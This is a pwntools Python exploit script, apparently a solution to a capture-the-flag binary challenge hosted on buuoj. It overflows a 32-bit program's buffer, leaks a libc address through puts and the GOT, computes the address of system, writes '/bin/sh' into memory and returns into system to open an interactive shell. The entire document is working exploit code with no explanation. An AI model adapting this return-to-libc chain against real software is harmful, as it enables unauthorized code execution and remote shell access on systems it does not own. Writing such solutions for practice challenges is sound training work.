from pwn import *
import sys

context.log_level = "info"
elf = ELF("./pwn")
pop_ebx_ret = 0x08048519 # pop ebx ; ret
bin_sh = b"/bin/sh\x00"

if len(sys.argv) == 2:
    if sys.argv[1] == "l":
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        sock = process(elf.path)
    elif sys.argv[1] == "d":
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        gs = """
            #break *0x804879e
            break *0x8048824
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
    libc = ELF("./libc-2.23.so")
    sock = remote("node4.buuoj.cn",26418)



def leak_libc_base_addr():
    global libc_base_addr
    global system_addr

    sock.send(b"\x00" + b"\xff" * 12)
    payload = b"A" * 0xeb
    payload += p32(elf.plt["puts"])
    payload += p32(pop_ebx_ret)
    payload += p32(elf.got["signal"])

    payload += p32(elf.plt["read"])
    payload += p32(0x8048825)
    payload += p32(0)
    payload += p32(0x804a0a0) # .data
    payload += p32(len(bin_sh))

    sock.send(payload)

    _ = sock.recvline()
    got_signal_addr = u32(sock.recv(4).ljust(4,b"\x00"))
    print(hex(got_signal_addr))
    libc_base_addr = got_signal_addr - libc.sym["signal"]
    log.info("libc_base_addr = " + hex(libc_base_addr))
    system_addr = libc_base_addr + libc.sym["system"]
    
    sock.send(bin_sh)


def attack():
    sock.send(b"\x00" + b"\xff" * 12)
    payload = b"B" * 0xeb
    payload += p32(system_addr)
    payload += p32(libc_base_addr + libc.sym["exit"])
    payload += p32(0x804a0a0) # "/bin/sh"
    sock.send(payload)



leak_libc_base_addr()
sleep(0.5)
attack()



sock.interactive()
